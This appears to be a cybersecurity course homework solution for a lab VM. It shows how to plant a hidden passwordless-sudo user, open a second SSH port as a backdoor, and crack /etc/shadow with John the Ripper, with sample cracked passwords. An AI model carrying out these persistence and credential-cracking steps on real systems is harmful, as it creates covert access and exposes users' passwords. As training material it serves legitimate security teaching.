## Week 6 Homework Solution: Advanced Bash - Owning the System

### Lab Setup

1. Log into the VM as `root` on the attacker machine:

    - Run `vagrant up` to stand up your lab environment.

    - Within the attacker machine, log in with the credentials:

        - Username: `sysadmin`
        - Password: `cybersecurity`

2. Using the attacker machine, remote into the target machine:

    - `ssh sysadmin@192.168.6.105 -p 22` and enter `passw0rd` when prompted.

3. After logging in as `sysadmin` on the target machine, run `sudo -s` to escalate your user to `root`. Enter `passw0rd` when prompted.

You will not need the above steps as part of your submission file.

### Step 1: Shadow People
1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `sudo useradd sysd`

2. Give your secret user a password:
    - `sudo passwd sysd`

3. Give your secret user a system UID < 1000:
    - `sudo usermod -u 400 sysd`
 
4. Give your secret user the same GID:
    - `sudo groupmod -g 400 sysd`

5. Give your secret user full `sudo` access without the need for a password:
    - `sudo visudo`

    - Add the line: `sysd ALL=(ALL:ALL) NOPASSWD:ALL` under the `root` entry:

    ```bash
    # User privilege specification
    root    ALL=(ALL:ALL) ALL
    sysd    ALL=(ALL:ALL) NOPASSWD:ALL
    # Members of the admin group may gain root privileges
    %admin ALL=(ALL) ALL
    ```

- Swap to your `sysd` user and enter the password you set.

    - `su sysd`

6. Test that `sudo` access works without your password:

    - `sudo -l` will show the following output:

    ```bash
    Matching Defaults entries for sysd on scavenger-hunt:
        env_reset, exempt_group=sudo, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User sysd may run the following commands on scavenger-hunt:
        (ALL : ALL) NOPASSWD: ALL
    ```

### Step 2: Smooth Sailing

1. Edit the `sshd_config` file:

    - Run `sudo nano /etc/ssh/sshd_config` and add the following line in the configuration file:

    ```bash
    # Add an extra port line:
    Port 22
    Port 2222
    ``` 

### Step 3: Testing Your Configuration Update
1. Restart the SSH service:
    - `service ssh restart` or
    - `systemctl restart ssh`

2. Exit the `root` account:
    - `exit`

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `ssh sysd@192.168.6.105 -p 2222`

4. Use `sudo` to switch to the root user:
    - `sudo su`

### Step 4: Crack All the Passwords

1. SSH back to the system using your `sysd` account and port `2222`:
    - `ssh sysd@192.168.6.105 -p 2222`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `sudo su`

    - `john /etc/shadow`

 Wait approximately 5-10 minutes for John to crack all the passwords.

 - This partly depends on what password you set for your `sysd` user.

    ```bash
    # john /etc/shadow
    Created directory: /root/.john
    Loaded 7 password hashes with 7 different salts (crypt, generic crypt(3) [?/64])
    Press 'q' or Ctrl-C to abort, almost any other key for status

    trustno1         (mitnik)
    dragon           (lovelace)

    passw0rd         (sysadmin)
    Goodluck!        (student)
    ```
